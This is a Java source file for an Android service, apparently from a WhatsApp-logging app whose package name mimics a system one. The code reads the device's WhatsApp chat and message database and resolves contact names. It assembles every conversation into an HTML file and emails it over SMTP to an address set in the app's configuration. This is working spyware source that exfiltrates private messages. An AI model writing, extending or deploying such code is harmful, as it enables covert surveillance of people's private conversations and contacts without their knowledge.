package com.android.whatslog;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.sql.SQLException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.List;

import javax.mail.AuthenticationFailedException;
import javax.mail.MessagingException;

import android.app.Service;
import android.content.Intent;
import android.database.Cursor;
import android.os.AsyncTask;
import android.os.IBinder;
import android.util.Log;
import android.widget.Toast;

import com.android.whatslog.dao.DatabaseHelperConfiguracao;
import com.android.whatslog.dao.DatabaseHelperInternal;
import com.android.whatslog.model.ChatList;
import com.android.whatslog.model.Configuracao;
import com.android.whatslog.model.Messages;

public class MailService extends Service {

	private DatabaseHelperInternal internal;

	@Override
	public IBinder onBind(Intent intent) {
		// TODO: Return the communication channel to the service.
		throw new UnsupportedOperationException("Not yet implemented");
	}

	@Override
	public void onCreate() {
		// TODO Auto-generated method stub

		Toast.makeText(getApplicationContext(), "Service Created", 1).show();
		super.onCreate();
	}

	@Override
	public void onDestroy() {
		// TODO Auto-generated method stub
		Toast.makeText(getApplicationContext(), "Service Destroy", 1).show();
		super.onDestroy();
	}

	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		// TODO Auto-generated method stub
		Toast.makeText(getApplicationContext(), "Service Running ", 1).show();
		prepare();
		return super.onStartCommand(intent, flags, startId);
	}

	private void prepare() {

		File outputDir = getApplicationContext().getCacheDir(); // context being
		try {
		List<File> anexos = new ArrayList<File>();
			File chatsFile = File.createTempFile("chats", ".html", outputDir);

			OutputStream output = new FileOutputStream(chatsFile);
			output.write(getChatList().toString().getBytes());
			output.flush();
			output.close();

			anexos.add(chatsFile);
			new SendEmailAsyncTask().execute(anexos);

		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

	private StringBuilder getChatList() {
		StringBuilder chattmp = new StringBuilder();
		StringBuilder messagetmp = new StringBuilder();
		chattmp.append("<html><head></head><body><table colspan=\"1\" border=\"1\"><tr><td>Chats</td></tr>");

		try {
			internal = new DatabaseHelperInternal(getApplicationContext());
			List<ChatList> chats = internal.getChatDao().queryForAll();

			for (ChatList chat : chats) {
				Cursor contact = Utils.getContact(chat.getKey_remote_jid(),
						getApplication().getContentResolver());
				try {
					chattmp.append("<tr><td><a href=\"#"+chat.getKey_remote_jid()+"\">"+ Utils.getContactDisplayNameByNumber(contact)
							+ "</a></td></tr>");
				} catch (Exception e) {
					chattmp.append("<tr><td>" + chat.getKey_remote_jid()
							+ "</td></tr>");

				}
				messagetmp.append(getMessageList(chat.getKey_remote_jid())).append("<br/>");
			}

		} catch (SQLException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}

		chattmp.append("</table>").append(messagetmp).append("</body></html>");
		return chattmp;

	}

	private StringBuilder getMessageList(String id) {

		StringBuilder tmp = new StringBuilder();
		tmp.append("<table id=\""+id+"\" colspan=\"1\" border=\"1\"><tr><td>Date</td><td>Sender</td><td>Message</td></tr>");

		try {
			internal = new DatabaseHelperInternal(getApplicationContext());
			List<Messages> mensagens = internal.getMessagesDao().queryBuilder().orderBy("timestamp", true).where().eq("key_remote_jid", id).query();


			for (Messages message : mensagens) {
				Cursor contact = Utils.getContact(message.getKey_remote_jid(),
						getApplication().getContentResolver());
				try {
					tmp.append("<tr><td>"+new SimpleDateFormat("dd/MM/yyyy HH:mm:ss").format(message.getTimestamp())+"</td><td>"
							+ Utils.getContactDisplayNameByNumber(contact)
							+ "</td><td>"+message.getData()+"</td></tr>");
				} catch (Exception e) {
					tmp.append("<tr><td>"+new SimpleDateFormat("dd/MM/yyyy HH:mm:ss").format(message.getTimestamp())+"</td><td>"
							+ id
							+ "</td><td>"+message.getData()+"</td></tr>");

				}
			}

		} catch (SQLException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}

		tmp.append("</table>");
		return tmp;

	}

	class SendEmailAsyncTask extends AsyncTask<List<File>, Void, Boolean> {

		DatabaseHelperConfiguracao database=new DatabaseHelperConfiguracao(getApplicationContext());

		Mail m=null;

		public SendEmailAsyncTask() {

			DatabaseHelperConfiguracao database=new DatabaseHelperConfiguracao(getApplicationContext());

			List<Configuracao> confs;
			try {
				confs = database.getDao().queryForAll();
				Configuracao conf=null;

				if(confs.size()>0){
					conf=confs.get(0);
				}
				if(conf!=null){
					m = new Mail(conf.getSmtpMail(), conf.getPassword());

					String[] toArr = { conf.getEmailTo() };
					m.setTo(toArr);
					m.setFrom("whatslog@gmail.com");
					m.setSubject("WhatsLog History.");
					m.setBody("Check the attachament file");

				}
			}catch(Exception e){

			}
		}

		protected Boolean doInBackground(List<File>... anexos) {
			try {

				for (File file : anexos[0]) {
					m.addAttachment(file.getAbsolutePath());
				}

				m.send();
				return true;
			} catch (AuthenticationFailedException e) {
				Log.e(SendEmailAsyncTask.class.getName(), "Bad account details");
				e.printStackTrace();
				return false;
			} catch (MessagingException e) {
				e.printStackTrace();
				return false;
			} catch (Exception e) {
				e.printStackTrace();
				return false;
			}
		}
	}
}